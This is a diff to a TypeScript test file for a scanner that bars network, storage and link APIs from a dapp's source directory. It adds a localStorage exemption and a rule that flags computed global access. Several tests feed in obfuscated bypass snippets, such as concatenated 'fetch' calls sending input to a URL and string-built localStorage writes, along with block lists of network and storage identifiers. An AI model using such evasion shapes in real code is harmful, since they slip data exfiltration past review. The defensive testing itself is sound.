@@ -625,7 +625,67 @@ const STORAGE_IDENTIFIERS = [
   'caches',
   'storage',
 ];
+
+// D-12/06-04: the guard's THIRD narrowing, ratified at Plan 04's own blocking checkpoint (Task
+// 0) — a third file-and-function-scoped exemption pair, mirroring the fetch and href exemptions
+// above exactly. Before this phase the claim was "no code in this directory can persist
+// anything"; after it, the claim is "only one file can persist anything, and every occurrence of
+// the one identifier it may name sits inside one named function" — narrower than the prohibition
+// it replaces, not broader. This exemption covers ONLY `localStorage`, checked below in
+// scanSourceFile — every other entry of STORAGE_IDENTIFIERS (including the bare word `storage`,
+// which does NOT match `localStorage` under the case-sensitive whole-word check below — this is
+// why the per-file allowlist skip is REQUIRED for the permitted-globals check, not optional) and
+// every entry of NETWORK_IDENTIFIERS still applies to cache.ts in full.
+const STORAGE_EXEMPT_FILES = ['cache.ts'];
+
+// The single identifier STORAGE_EXEMPT_FILES exempts — never widen this to a set, matching
+// NETWORK_EXEMPTED_IDENTIFIER/LINK_EXEMPTED_IDENTIFIER's own precedent above.
+const STORAGE_EXEMPTED_IDENTIFIER = 'localStorage';
+
+// D-12 part 2: the one named function permitted to reference the persistence identifier —
+// asserted below to be the ONLY place `localStorage` may appear anywhere in this directory.
+// Like `href` (LINK_HELPER_NAME) and unlike `fetch` (a call), `localStorage` is used as an
+// OBJECT (`window.localStorage.getItem(...)`), so its containment check (below) matches bare
+// occurrences, not invocations — the link exemption's shape is the right model here, not the
+// fetch exemption's.
+const STORAGE_HELPER_NAME = 'cchCreatePersistenceAccess';
 const ORG_PREFIX_RE = /\bDnzn[A-Za-z0-9]*\b/g;
+
+// WR-05: the string-and-comment stripper (stripComments, above) treats a template literal's
+// whole body as one opaque string, so `window[\`${'fe'}tch\`]` and `window['fe' + 'tch']` both
+// scan as literal punctuation the NETWORK_IDENTIFIERS whole-word check cannot match — the exact
+// mechanism this phase's own `${'a'}ction` workaround (below) relied on to slip the word
+// "action" past the guard. Rather than teach the stripper to evaluate concatenation and template
+// expressions (a real parser's job, explicitly out of scope per this file's own header), this
+// closes the CHEAP half of the hole: computed member access on the three global objects a
+// network or storage escape hatch is reached through is flagged outright, independent of what is
+// inside the brackets. A legitimate need to name one of these globals by a computed key does not
+// exist anywhere in this directory today; the fix for a genuine future need is to name the
+// member directly (`window.fetch`), which the existing whole-word scan already catches.
+const COMPUTED_GLOBAL_ACCESS_RE = /\b(window|globalThis|self)\s*\[/g;
+
+function checkComputedGlobalAccess(code: string): string[] {
+  const found = new Set<string>();
+  for (const m of code.matchAll(COMPUTED_GLOBAL_ACCESS_RE)) {
+    found.add(m[1]);
+  }
+  return [...found];
+}
+
+// WR-05 (2): the honest resolution of the `${'a'}ction` workaround this phase wrote into
+// abi-source.ts and tx-source.ts — both concatenate a JS keyword-shaped literal to spell
+// Etherscan's own `action` query-parameter name, specifically to dodge the NETWORK_IDENTIFIERS
+// whole-word check on "action" (an HTML form's own network-triggering attribute, a real escape
+// shape). That trick used the SAME evasion this file now closes above for `fetch`/`localStorage`
+// — a guard that closes half a hole while a in-repo workaround stands as a worked example of the
+// other half inverts the guard's purpose. The fix is not to widen the scanner to evaluate
+// template expressions; it is to make the concession explicit and audited, exactly like the
+// three EXEMPT_FILES pairs above: name the two files and the one literal each may write as a
+// plain string, asserted to exactly these two entries so the allowlist cannot silently grow.
+const ALLOWED_PROTOCOL_LITERALS: Record<string, string[]> = {
+  'abi-source.ts': ['action'],
+  'tx-source.ts': ['action'],
+};
 
 function checkForbidden(code: string, identifiers: string[]): string[] {
   const found: string[] = [];
@@ -743,6 +803,27 @@ function checkLinkContainment(code: string): string[] {
   return violations;
 }
 
+// D-12 part 2 (06-04): the guard's third and final narrowing. `localStorage` is permitted only
+// inside `cchCreatePersistenceAccess`'s own body, in `cache.ts`, and nowhere else in the
+// directory. Same bare-occurrence shape as checkLinkContainment above (never invocation-shaped,
+// matching how `localStorage` is actually used as an object).
+function checkStorageContainment(code: string): string[] {
+  const range = findFunctionBodyRange(code, STORAGE_HELPER_NAME);
+  const violations: string[] = [];
+  const re = new RegExp(`\\b${STORAGE_EXEMPTED_IDENTIFIER}\\b`, 'g');
+  let m: RegExpExecArray | null = re.exec(code);
+  while (m !== null) {
+    const inside = range !== null && m.index >= range.start && m.index < range.end;
+    if (!inside) {
+      violations.push(
+        `references "${STORAGE_EXEMPTED_IDENTIFIER}" outside ${STORAGE_HELPER_NAME}() — only that function may reference the persistence identifier`,
+      );
+    }
+    m = re.exec(code);
+  }
+  return violations;
+}
+
 // ── The other-dapp id and route lists, derived from the manifests on disk ─────────────────
 
 function loadAllManifests(): { id: string; route: string }[] {
@@ -823,13 +904,27 @@ function scanSourceFile(name: string, content: string): string[] {
   const isNetworkExempt = NETWORK_EXEMPT_FILES.includes(name);
   // D-03 part 3: same shape, for the link helper's `href` exemption.
   const isLinkExempt = LINK_EXEMPT_FILES.includes(name);
+  // D-12 part 2 (06-04): same shape, for cache.ts's `localStorage` exemption.
+  const isStorageExempt = STORAGE_EXEMPT_FILES.includes(name);
 
   for (const v of checkOrgPrefix(code)) {
     violations.push(`${name}: org-prefixed identifier "${v}"`);
   }
+  // WR-05: runs against `code` (fully stripped — no retained strings), independent of the
+  // NETWORK_IDENTIFIERS word scan below, so a concatenation- or template-obfuscated key inside
+  // the brackets (which defeats that whole-word scan) is still caught by the bracket syntax
+  // itself. Not exempted for any file — the three narrowed exemptions below (fetch/href/
+  // localStorage) all require the identifier to be NAMED, never reached through a computed key.
+  for (const v of checkComputedGlobalAccess(code)) {
+    violations.push(
+      `${name}: computed access to a global ("${v}[...]") is not scannable — name the member instead of using bracket notation`,
+    );
+  }
   for (const v of checkForbidden(commentsOnly, NETWORK_IDENTIFIERS)) {
     if (isNetworkExempt && v === NETWORK_EXEMPTED_IDENTIFIER) continue;
     if (isLinkExempt && v === LINK_EXEMPTED_IDENTIFIER) continue;
+    // WR-05: the one audited protocol-literal concession — see ALLOWED_PROTOCOL_LITERALS above.
+    if (ALLOWED_PROTOCOL_LITERALS[name]?.includes(v)) continue;
     violations.push(
       `${name}: references a network-request API ("${v}") — no code in this directory can make a request, ` +
         `except ${NETWORK_EXEMPT_FILES.join(', ')}, and only inside ${LOG_WRITING_FUNCTION}(), ` +
@@ -846,7 +941,17 @@ function scanSourceFile(name: string, content: string): string[] {
       violations.push(`${name}: ${v}`);
     }
   }
+  if (isStorageExempt) {
+    for (const v of checkStorageContainment(code)) {
+      violations.push(`${name}: ${v}`);
+    }
+  }
   for (const v of checkForbidden(commentsOnly, STORAGE_IDENTIFIERS)) {
+    // D-12 part 2: the exemption covers exactly this one file and exactly this one identifier —
+    // the bare word "storage" does NOT match "localStorage" here (case-sensitive whole-word
+    // matching), so every other entry of this list, including the bare word, still applies to
+    // cache.ts in full.
+    if (isStorageExempt && v === STORAGE_EXEMPTED_IDENTIFIER) continue;
     violations.push(`${name}: references a browser persistent-storage API ("${v}")`);
   }
   // CSS has no JS-shaped runtime global references — var()/rgba()/minmax() etc. would
@@ -858,6 +963,9 @@ function scanSourceFile(name: string, content: string): string[] {
       // than by adding fetch to the shared list.
       if (isNetworkExempt && v === NETWORK_EXEMPTED_IDENTIFIER) continue;
       if (isLinkExempt && v === LINK_EXEMPTED_IDENTIFIER) continue;
+      // D-12 part 2: same per-file skip, applied here (not by adding it to the shared
+      // allowlist) — required because "storage" alone would not have exempted it above.
+      if (isStorageExempt && v === STORAGE_EXEMPTED_IDENTIFIER) continue;
       violations.push(`${name}: unlisted global "${v}" — not on the permitted-globals allowlist`);
     }
   }
@@ -1051,6 +1159,56 @@ describe('D-03 part 3: the link helper href exemption (05-06)', () => {
   });
 });
 
+describe('D-12 part 2 (06-04): the cache.ts localStorage exemption', () => {
+  it('has exactly one entry, and it is cache.ts', () => {
+    expect(STORAGE_EXEMPT_FILES).toHaveLength(1);
+    expect(STORAGE_EXEMPT_FILES).toContain('cache.ts');
+  });
+
+  it('a synthetic non-exempt file naming localStorage is still reported, worded to name the exemption', () => {
+    const violations = scanSourceFile('other.ts', "localStorage.setItem('a', 'b');");
+    expect(violations.some((v) => v.includes('persistent-storage') && v.includes('localStorage'))).toBe(true);
+  });
+
+  it('a synthetic exempt file with localStorage OUTSIDE cchCreatePersistenceAccess is reported, naming that function', () => {
+    const content = `
+      function helper() { return localStorage.getItem('x'); }
+      function cchCreatePersistenceAccess() { return null; }
+    `;
+    const violations = scanSourceFile('cache.ts', content);
+    expect(violations.some((v) => v.includes('outside cchCreatePersistenceAccess'))).toBe(true);
+  });
+
+  it('the same reference INSIDE cchCreatePersistenceAccess is not reported', () => {
+    const content = `
+      function cchCreatePersistenceAccess() {
+        return { read: (k) => localStorage.getItem(k) };
+      }
+    `;
+    const violations = scanSourceFile('cache.ts', content);
+    expect(violations).toEqual([]);
+  });
+
+  it('a synthetic exempt file naming the bare persistence word, or a network primitive, is still reported', () => {
+    const bareWordContent = `
+      function cchCreatePersistenceAccess() {
+        // a stray reference to the forbidden bare word, outside the exempted identifier
+        return storage;
+      }
+    `;
+    const bareWordViolations = scanSourceFile('cache.ts', bareWordContent);
+    expect(bareWordViolations.some((v) => v.includes('persistent-storage') && v.includes('"storage"'))).toBe(true);
+
+    const networkViolations = scanSourceFile('cache.ts', "function go() { return fetch('/x'); }");
+    expect(networkViolations.some((v) => v.includes('"fetch"'))).toBe(true);
+  });
+
+  it('a file with no cchCreatePersistenceAccess declared at all reports every localStorage reference as out of bounds', () => {
+    const violations = scanSourceFile('cache.ts', "const x = localStorage.getItem('a');");
+    expect(violations.some((v) => v.includes('outside cchCreatePersistenceAccess'))).toBe(true);
+  });
+});
+
 describe('comment-and-string stripping', () => {
   it('removes line comments, block comments, and quoted string literals', () => {
     const { code, strings } = stripCommentsAndStrings(
@@ -1175,6 +1333,68 @@ describe('WR-01 — string-built and property-assignment exfiltration/persistenc
   it('bracket-notation localStorage built from a string literal', () => {
     const violations = scanSourceFile('f.ts', "window['localStorage'].setItem('d', input);");
     expect(violations.some((v) => v.includes('localStorage'))).toBe(true);
+  });
+});
+
+// ── WR-05: concatenation-obfuscated identifiers, and the audited "action" concession ──────
+//
+// The WR-01 shapes above are all built from a SINGLE string literal — `window['fetch']` — which
+// the retained-string scan (`commentsOnly`) already catches because the word "fetch" appears
+// intact inside one retained string. Concatenation defeats that: `window['fe' + 'tch']` retains
+// "fe" and "tch" as two SEPARATE string fragments, and the word "fetch" never appears contiguous
+// anywhere in the scanned text. This phase's own `${'a'}ction` workaround (now removed from
+// abi-source.ts/tx-source.ts) proved the same mechanism works for a template-literal expression,
+// not just `+`.
+describe('WR-05 — concatenation-obfuscated globals, and the audited protocol-literal allowlist', () => {
+  it("window['fe' + 'tch'] in a non-exempt file is caught — the exact bypass shape the guard previously missed", () => {
+    const violations = scanSourceFile('g.ts', "window['fe' + 'tch']('https://x/?d=' + input);");
+    expect(violations.some((v) => v.includes('computed access'))).toBe(true);
+  });
+
+  it('the template-literal form of the same bypass (window bracket, backtick-quoted) is caught too', () => {
+    // Built via concatenation rather than one literal containing the bypass's own template-curly
+    // text verbatim — a literal that shape would itself trip Biome's noTemplateCurlyInString rule
+    // as a probable-forgotten-interpolation false positive.
+    const templateLiteralBypass = 'window[`$' + "{'fe'}tch`](url);";
+    const violations = scanSourceFile('h.ts', templateLiteralBypass);
+    expect(violations.some((v) => v.includes('computed access'))).toBe(true);
+  });
+
+  it("globalThis['local' + 'Storage'] and self['fetch'] are caught by the same rule", () => {
+    const globalThisViolations = scanSourceFile('i.ts', "globalThis['local' + 'Storage'].setItem('a', 'b');");
+    expect(globalThisViolations.some((v) => v.includes('computed access'))).toBe(true);
+
+    const selfViolations = scanSourceFile('j.ts', "self['fetch'](url);");
+    expect(selfViolations.some((v) => v.includes('computed access'))).toBe(true);
+  });
+
+  it('a plain, NAMED global reference produces no computed-access violation — only bracket notation is flagged', () => {
+    const violations = scanSourceFile('k.ts', 'const x = window.location;');
+    expect(violations.some((v) => v.includes('computed access'))).toBe(false);
+  });
+
+  it('ALLOWED_PROTOCOL_LITERALS has exactly two entries, abi-source.ts and tx-source.ts, each naming only "action"', () => {
+    expect(Object.keys(ALLOWED_PROTOCOL_LITERALS)).toHaveLength(2);
+    expect(ALLOWED_PROTOCOL_LITERALS['abi-source.ts']).toEqual(['action']);
+    expect(ALLOWED_PROTOCOL_LITERALS['tx-source.ts']).toEqual(['action']);
+  });
+
+  it('a synthetic non-exempt file naming "action" as a plain literal is still reported — the allowlist is per-file, not global', () => {
+    const violations = scanSourceFile('other.ts', "const p = 'action';");
+    expect(violations.some((v) => v.includes('"action"'))).toBe(true);
+  });
+
+  it('the allowlisted files may write the plain "action" literal with no violation', () => {
+    expect(scanSourceFile('abi-source.ts', "const p = 'action';")).toEqual([]);
+    expect(scanSourceFile('tx-source.ts', "const p = 'action';")).toEqual([]);
+  });
+
+  it('the real abi-source.ts and tx-source.ts no longer carry the concatenation workaround', () => {
+    const concatenationWorkaround = '$' + "{'a'}ction";
+    const abiSourceContent = readFileSync(resolve(DECODE_DIR, 'abi-source.ts'), 'utf-8');
+    const txSourceContent = readFileSync(resolve(DECODE_DIR, 'tx-source.ts'), 'utf-8');
+    expect(abiSourceContent).not.toContain(concatenationWorkaround);
+    expect(txSourceContent).not.toContain(concatenationWorkaround);
   });
 });
 
